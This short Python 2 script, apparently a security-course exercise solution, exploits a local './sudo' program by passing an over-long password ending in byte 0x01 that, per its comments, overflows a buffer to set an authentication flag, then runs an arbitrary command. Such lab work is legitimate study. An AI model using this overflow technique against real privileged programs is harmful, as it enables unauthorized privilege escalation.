import os, sys


PATH_TO_SUDO = './sudo'


def run_command(cmd):
	#overflows buffer and puts 1 in auth
	password = "111111111"+chr(1)
	#executes the command with the overfloaded password
	os.execl('./sudo','./sudo',password,cmd)


def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
